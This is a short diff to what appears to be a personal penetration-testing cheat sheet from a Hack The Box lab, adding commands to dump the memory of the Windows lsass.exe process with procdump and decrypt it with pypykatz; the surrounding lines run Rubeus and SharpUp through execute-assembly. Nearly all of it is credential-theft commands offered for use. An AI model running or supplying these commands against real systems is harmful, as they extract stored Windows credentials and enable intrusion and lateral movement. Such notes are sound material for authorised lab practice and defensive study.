@@ -31,4 +31,11 @@ sharpup -- audit
 
 # running rubues
 execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
+
+
+# dump lsass.exe (REQUIRE SYSTEM PRIVILEGES):
+ps -e lsass
+procdump --pid 660 --save /tmp/lsass.dmp
+
+pypykatz lsa minidump /tmp/lsass.dmp # decrypt it
 ```
